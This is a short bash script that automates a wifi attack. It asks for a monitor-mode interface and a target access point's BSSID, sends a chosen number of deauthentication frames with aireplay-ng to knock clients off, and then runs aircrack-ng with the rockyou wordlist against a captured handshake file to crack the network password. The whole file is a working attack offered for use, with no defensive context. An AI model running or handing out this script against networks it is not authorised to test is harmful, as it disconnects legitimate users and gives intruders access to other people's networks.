#! /bin/bash

# write required data
printf "Write name of your wifi card in monitor mode: "
read wifi_card_mon
printf "Write device bssid, which you want to crack: "
read bssid

# begin deauth attack
printf "Write number of deauthorizations: "
read attempt_num
aireplay-ng --deauth $attempt_num -a $bssid --ignore-negative-one $wifi_card_mon

# enumeration of passwords
aircrack-ng -w '/usr/share/wordlists/rockyou.txt' -b $bssid "hacks/try-01.cap"